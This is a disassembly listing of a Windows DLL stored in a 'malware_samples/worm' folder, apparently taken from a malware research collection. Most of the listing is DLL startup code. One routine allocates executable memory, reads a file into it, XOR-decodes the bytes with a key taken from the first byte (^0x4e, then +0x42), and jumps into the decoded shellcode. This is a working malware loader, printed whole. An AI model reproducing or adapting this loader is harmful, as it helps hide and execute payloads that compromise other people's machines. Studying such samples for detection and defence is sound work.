
malware_samples/worm/19b9b3ad61f98cea8eb2ae581f35ef77aea62611d47b7f48cf216babcd6d2b38.dll:     file format pei-i386


Disassembly of section .text:

10001000 <.text>:
10001000:	8b 44 24 08          	mov    0x8(%esp),%eax
10001004:	85 c0                	test   %eax,%eax
10001006:	75 0e                	jne    0x10001016
10001008:	39 05 24 32 00 10    	cmp    %eax,0x10003224
1000100e:	7e 2e                	jle    0x1000103e
10001010:	ff 0d 24 32 00 10    	decl   0x10003224
10001016:	8b 0d 24 20 00 10    	mov    0x10002024,%ecx
1000101c:	83 f8 01             	cmp    $0x1,%eax
1000101f:	8b 09                	mov    (%ecx),%ecx
10001021:	89 0d 38 32 00 10    	mov    %ecx,0x10003238
10001027:	75 3f                	jne    0x10001068
10001029:	68 80 00 00 00       	push   $0x80
1000102e:	ff 15 20 20 00 10    	call   *0x10002020
10001034:	85 c0                	test   %eax,%eax
10001036:	59                   	pop    %ecx
10001037:	a3 40 32 00 10       	mov    %eax,0x10003240
1000103c:	75 04                	jne    0x10001042
1000103e:	33 c0                	xor    %eax,%eax
10001040:	eb 66                	jmp    0x100010a8
10001042:	83 20 00             	andl   $0x0,(%eax)
10001045:	a1 40 32 00 10       	mov    0x10003240,%eax
1000104a:	68 04 30 00 10       	push   $0x10003004
1000104f:	68 00 30 00 10       	push   $0x10003000
10001054:	a3 3c 32 00 10       	mov    %eax,0x1000323c
10001059:	e8 ea 00 00 00       	call   0x10001148
1000105e:	ff 05 24 32 00 10    	incl   0x10003224
10001064:	59                   	pop    %ecx
10001065:	59                   	pop    %ecx
10001066:	eb 3d                	jmp    0x100010a5
10001068:	85 c0                	test   %eax,%eax
1000106a:	75 39                	jne    0x100010a5
1000106c:	a1 40 32 00 10       	mov    0x10003240,%eax
10001071:	85 c0                	test   %eax,%eax
10001073:	74 30                	je     0x100010a5
10001075:	8b 0d 3c 32 00 10    	mov    0x1000323c,%ecx
1000107b:	56                   	push   %esi
1000107c:	8d 71 fc             	lea    -0x4(%ecx),%esi
1000107f:	3b f0                	cmp    %eax,%esi
10001081:	72 12                	jb     0x10001095
10001083:	8b 0e                	mov    (%esi),%ecx
10001085:	85 c9                	test   %ecx,%ecx
10001087:	74 07                	je     0x10001090
10001089:	ff d1                	call   *%ecx
1000108b:	a1 40 32 00 10       	mov    0x10003240,%eax
10001090:	83 ee 04             	sub    $0x4,%esi
10001093:	eb ea                	jmp    0x1000107f
10001095:	50                   	push   %eax
10001096:	ff 15 18 20 00 10    	call   *0x10002018
1000109c:	83 25 40 32 00 10 00 	andl   $0x0,0x10003240
100010a3:	59                   	pop    %ecx
100010a4:	5e                   	pop    %esi
100010a5:	6a 01                	push   $0x1
100010a7:	58                   	pop    %eax
100010a8:	c2 0c 00             	ret    $0xc
100010ab:	55                   	push   %ebp
100010ac:	8b ec                	mov    %esp,%ebp
100010ae:	53                   	push   %ebx
100010af:	8b 5d 08             	mov    0x8(%ebp),%ebx
100010b2:	56                   	push   %esi
100010b3:	8b 75 0c             	mov    0xc(%ebp),%esi
100010b6:	57                   	push   %edi
100010b7:	8b 7d 10             	mov    0x10(%ebp),%edi
100010ba:	85 f6                	test   %esi,%esi
100010bc:	75 09                	jne    0x100010c7
100010be:	83 3d 24 32 00 10 00 	cmpl   $0x0,0x10003224
100010c5:	eb 26                	jmp    0x100010ed
100010c7:	83 fe 01             	cmp    $0x1,%esi
100010ca:	74 05                	je     0x100010d1
100010cc:	83 fe 02             	cmp    $0x2,%esi
100010cf:	75 22                	jne    0x100010f3
100010d1:	a1 44 32 00 10       	mov    0x10003244,%eax
100010d6:	85 c0                	test   %eax,%eax
100010d8:	74 09                	je     0x100010e3
100010da:	57                   	push   %edi
100010db:	56                   	push   %esi
100010dc:	53                   	push   %ebx
100010dd:	ff d0                	call   *%eax
100010df:	85 c0                	test   %eax,%eax
100010e1:	74 0c                	je     0x100010ef
100010e3:	57                   	push   %edi
100010e4:	56                   	push   %esi
100010e5:	53                   	push   %ebx
100010e6:	e8 15 ff ff ff       	call   0x10001000
100010eb:	85 c0                	test   %eax,%eax
100010ed:	75 04                	jne    0x100010f3
100010ef:	33 c0                	xor    %eax,%eax
100010f1:	eb 4e                	jmp    0x10001141
100010f3:	57                   	push   %edi
100010f4:	56                   	push   %esi
100010f5:	53                   	push   %ebx
100010f6:	e8 fd 00 00 00       	call   0x100011f8
100010fb:	83 fe 01             	cmp    $0x1,%esi
100010fe:	89 45 0c             	mov    %eax,0xc(%ebp)
10001101:	75 0c                	jne    0x1000110f
10001103:	85 c0                	test   %eax,%eax
10001105:	75 37                	jne    0x1000113e
10001107:	57                   	push   %edi
10001108:	50                   	push   %eax
10001109:	53                   	push   %ebx
1000110a:	e8 f1 fe ff ff       	call   0x10001000
1000110f:	85 f6                	test   %esi,%esi
10001111:	74 05                	je     0x10001118
10001113:	83 fe 03             	cmp    $0x3,%esi
10001116:	75 26                	jne    0x1000113e
10001118:	57                   	push   %edi
10001119:	56                   	push   %esi
1000111a:	53                   	push   %ebx
1000111b:	e8 e0 fe ff ff       	call   0x10001000
10001120:	85 c0                	test   %eax,%eax
10001122:	75 03                	jne    0x10001127
10001124:	21 45 0c             	and    %eax,0xc(%ebp)
10001127:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000112b:	74 11                	je     0x1000113e
1000112d:	a1 44 32 00 10       	mov    0x10003244,%eax
10001132:	85 c0                	test   %eax,%eax
10001134:	74 08                	je     0x1000113e
10001136:	57                   	push   %edi
10001137:	56                   	push   %esi
10001138:	53                   	push   %ebx
10001139:	ff d0                	call   *%eax
1000113b:	89 45 0c             	mov    %eax,0xc(%ebp)
1000113e:	8b 45 0c             	mov    0xc(%ebp),%eax
10001141:	5f                   	pop    %edi
10001142:	5e                   	pop    %esi
10001143:	5b                   	pop    %ebx
10001144:	5d                   	pop    %ebp
10001145:	c2 0c 00             	ret    $0xc
10001148:	ff 25 1c 20 00 10    	jmp    *0x1000201c
1000114e:	56                   	push   %esi
1000114f:	57                   	push   %edi
10001150:	68 2c 20 00 10       	push   $0x1000202c
10001155:	68 3c 20 00 10       	push   $0x1000203c
1000115a:	ff 15 10 20 00 10    	call   *0x10002010
10001160:	50                   	push   %eax
10001161:	ff 15 08 20 00 10    	call   *0x10002008
10001167:	6a 01                	push   $0x1
10001169:	33 ff                	xor    %edi,%edi
1000116b:	57                   	push   %edi
1000116c:	57                   	push   %edi
1000116d:	68 54 20 00 10       	push   $0x10002054
10001172:	68 18 32 00 10       	push   $0x10003218
10001177:	57                   	push   %edi
10001178:	ff d0                	call   *%eax
1000117a:	6a 40                	push   $0x40
1000117c:	be 00 10 00 00       	mov    $0x1000,%esi
10001181:	56                   	push   %esi
10001182:	56                   	push   %esi
10001183:	57                   	push   %edi
10001184:	ff 15 0c 20 00 10    	call   *0x1000200c
1000118a:	57                   	push   %edi
1000118b:	68 80 00 00 00       	push   $0x80
10001190:	6a 03                	push   $0x3
10001192:	57                   	push   %edi
10001193:	6a 01                	push   $0x1
10001195:	68 00 00 00 80       	push   $0x80000000
1000119a:	68 10 30 00 10       	push   $0x10003010
1000119f:	a3 28 32 00 10       	mov    %eax,0x10003228
100011a4:	ff 15 04 20 00 10    	call   *0x10002004
100011aa:	a3 2c 32 00 10       	mov    %eax,0x1000322c
100011af:	83 f8 ff             	cmp    $0xffffffff,%eax
100011b2:	74 3f                	je     0x100011f3
100011b4:	57                   	push   %edi
100011b5:	68 30 32 00 10       	push   $0x10003230
100011ba:	56                   	push   %esi
100011bb:	ff 35 28 32 00 10    	push   0x10003228
100011c1:	50                   	push   %eax
100011c2:	ff 15 00 20 00 10    	call   *0x10002000
100011c8:	a1 28 32 00 10       	mov    0x10003228,%eax
100011cd:	0f b6 08             	movzbl (%eax),%ecx
100011d0:	83 f1 4e             	xor    $0x4e,%ecx
100011d3:	33 f6                	xor    %esi,%esi
100011d5:	39 3d 30 32 00 10    	cmp    %edi,0x10003230
100011db:	76 14                	jbe    0x100011f1
100011dd:	8a 14 30             	mov    (%eax,%esi,1),%dl
100011e0:	32 d1                	xor    %cl,%dl
100011e2:	80 c2 42             	add    $0x42,%dl
100011e5:	88 14 30             	mov    %dl,(%eax,%esi,1)
100011e8:	46                   	inc    %esi
100011e9:	3b 35 30 32 00 10    	cmp    0x10003230,%esi
100011ef:	72 ec                	jb     0x100011dd
100011f1:	ff d0                	call   *%eax
100011f3:	5f                   	pop    %edi
100011f4:	5e                   	pop    %esi
100011f5:	c2 10 00             	ret    $0x10
100011f8:	33 c0                	xor    %eax,%eax
100011fa:	40                   	inc    %eax
100011fb:	c2 0c 00             	ret    $0xc
